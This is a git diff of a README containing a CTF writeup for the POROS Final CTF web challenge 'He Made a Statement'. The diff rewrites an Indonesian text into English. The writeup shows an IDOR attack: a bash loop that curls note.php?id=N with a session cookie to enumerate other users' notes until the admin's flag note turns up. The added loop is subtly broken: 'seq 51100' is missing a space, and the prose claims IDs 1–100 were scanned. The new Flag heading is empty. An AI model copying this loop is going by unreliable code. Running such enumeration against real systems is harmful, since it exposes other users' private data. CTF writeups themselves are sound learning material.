@@ -1,30 +1,42 @@
-This repository shows the documentation and write up for my work at POROS' Final CTF Stage.
+# FinalCTF-Poros — Web Exploitation Writeup
 
-**Web Exploitation**
+Personal CTF writeup for the POROS Final CTF Stage.
 
-**[493 pts] he made a statement
-Author: zenc**
+---
 
-Saat membuka 10.34.9.91:7001, masuk ke login page dan diberikan informasi login:
-Username: user
-Password: userpass
-Setelah login, akan di-direct ke page dashboard dengan semua catatan dan ID-nya namun tidak semua ID-nya ada, seperti 2, 3, 5, 7, 8, dst. 
-Pertama saya mencoba mengakses notes yang ID-nya tidak ditampilkan, seperti 2, 3, 5, 7, 8, dst. Lalu ada 1 ID (41) yang berbeda karena ownernya adalah admin dan notenya flag, namun flag palsu
+## Web Exploitation
 
-Karena sudah menemukan hal seperti ini, saya lanjutkan hingga ID 100 dengan command: for i in $(seq 51 100); do
+### [493 pts] He Made a Statement
+**Author:** zenc
+
+#### Overview
+Upon opening the login page at `10.34.9.91:7001`, credentials were provided:
+- **Username:** `user`
+- **Password:** `userpass`
+
+After logging in, the dashboard displayed all notes with their IDs — but not every ID was shown (e.g., 2, 3, 5, 7, 8, etc.).
+
+#### Approach
+
+One note (ID 41) stood out — it was owned by `admin` and contained a fake flag.
+
+To enumerate all notes, I iterated through IDs 1–100 using the following bash command:
+
+```bash
+for i in $(seq 51100); do
   result=$(curl -s -b cookies.txt "http://10.34.9.91:7001/note.php?id=$i")
   owner=$(echo "$result" | grep -o "Owner: [^<]*")
-  note=$(echo "$result" | grep -o "class=\"note\">[^<]*" | cut -d'>' -f2)
+  note=$(echo "$result" | grep -o 'class="note">[^<]*' | cut -d'>' -f2)
   if [ -n "$note" ]; then
     echo "ID $i | $owner | $note"
   fi
-Done
+done
+```
 
-Lalu ditemukan: 
+#### Result
 
-ID-67, owner admin, dan flag sebagai notesnya
-Jika dilihat langsung dari webnya dan masukkan URL sesuai ID 67 yaitu http://54.252.114.9:8080/note.php?id=67, flag juga akan muncul
+Found **ID 67** — owned by `admin`, with the flag as its note content.
 
+Navigating directly to `http://54.252.114.9:8080/note.php?id=67` confirmed it.
 
-**Flag 
-PorosCTF{34sy_a5_fuck_1dor_wait_f0r_th3_0thers_llmnx}**
+#### Flag
